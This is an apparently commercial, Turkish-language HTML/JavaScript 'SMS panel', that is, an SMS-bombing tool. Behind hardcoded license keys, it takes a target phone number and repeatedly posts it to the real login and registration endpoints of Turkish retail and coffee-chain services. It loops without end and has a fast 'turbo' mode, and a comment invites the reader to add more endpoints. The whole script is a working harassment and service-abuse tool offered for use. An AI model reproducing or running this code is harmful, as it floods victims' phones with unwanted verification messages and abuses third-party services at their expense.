<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JINDEX STUDIO - SMS PANEL 2026</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #00ffcc;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #111;
            border: 2px solid #00ffcc;
            padding: 30px;
            box-shadow: 0 0 15px #00ffcc;
            border-radius: 8px;
            width: 400px;
            text-align: center;
        }
        h1 { color: #ff0055; font-size: 24px; margin-bottom: 20px; text-shadow: 0 0 5px #ff0055; }
        input, select, button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #000;
            border: 1px solid #00ffcc;
            color: #fff;
            box-sizing: border-box;
            font-family: monospace;
        }
        button {
            background: #ff0055;
            color: #fff;
            border: none;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
        }
        button:hover { background: #00ffcc; color: #000; box-shadow: 0 0 10px #00ffcc; }
        #log {
            height: 150px;
            background: #000;
            border: 1px solid #333;
            margin-top: 15px;
            overflow-y: scroll;
            padding: 10px;
            text-align: left;
            font-size: 12px;
            color: #aaa;
        }
        .success { color: #00ff00; }
        .fail { color: #ff0000; }
    </style>
</head>
<body>

<div class="container">
    <h1>JINDEX STUDIO SMS SYSTEM</h1>
    <input type="text" id="key" placeholder="Ürün Anahtarını Girin">
    <input type="text" id="phone" placeholder="Telefon No (Örn: 5051234567)">
    
    <select id="mode">
        <option value="1">Standart Gönderim</option>
        <option value="2">TURBO MOD</option>
    </select>

    <button id="startBtn" onclick="startProcess()">SİSTEMİ BAŞLAT</button>
    
    <div id="log">>> Sistem hazır. Anahtar girip başlatın...</div>
</div>

<script>
const LICENSE_KEYS = {
    "JINDEX-PREM-2026-X7K9": "prem",
    "JINDEX-ULTRA-2026-4M2P": "ultra",
    "JINDEX-DENEME-2026-TEST": "deneme"
};

let isRunning = false;

function logMessage(msg, type="") {
    const logDiv = document.getElementById("log");
    let colorClass = type === "success" ? "success" : (type === "fail" ? "fail" : "");
    logDiv.innerHTML += `<div class="${colorClass}">[+] ${msg}</div>`;
    logDiv.scrollTop = logDiv.scrollHeight;
}

async function sendBim(phone) {
    try {
        let r = await fetch("https://bim.veesk.net/service/v1.0/account/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone: phone })
        });
        if(r.status === 200) logMessage(`${phone} --> bim.veesk.net`, "success");
        else throw new Error();
    } catch { logMessage(`${phone} --> bim.veesk.net Başarısız`, "fail"); }
}

async function sendKahveDunyasi(phone) {
    try {
        let r = await fetch("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ countryCode: "90", phoneNumber: phone })
        });
        let json = await r.json();
        if(json.processStatus === "Success") logMessage(`${phone} --> kahvedunyasi.com`, "success");
        else throw new Error();
    } catch { logMessage(`${phone} --> kahvedunyasi.com Başarısız`, "fail"); }
}

// Diğer API'leri de buraya aynı mantıkla ekleyebilirsin.

async function startProcess() {
    const key = document.getElementById("key").value.trim();
    const phone = document.getElementById("phone").value.trim();
    const mode = document.getElementById("mode").value;
    
    if (!LICENSE_KEYS[key]) {
        alert("HATALI ÜRÜN ANAHTARI!");
        return;
    }

    if (phone.length !== 10) {
        alert("Telefon numarası 10 haneli olmalıdır!");
        return;
    }

    if(isRunning) {
        isRunning = false;
        document.getElementById("startBtn").innerText = "SİSTEMİ BAŞLAT";
        logMessage("Sistem durduruldu.");
        return;
    }

    isRunning = true;
    document.getElementById("startBtn").innerText = "DURDUR";
    logMessage("Gönderim başlatıldı...");

    while(isRunning) {
        await sendBim(phone);
        await sendKahveDunyasi(phone);
        
        if(mode === "1") {
            await new Promise(r => setTimeout(r, 2000)); // Standart modda bekler
        } else {
            await new Promise(r => setTimeout(r, 200));  // Turbo modda çok hızlı döner
        }
    }
}
</script>

</body>
</html>
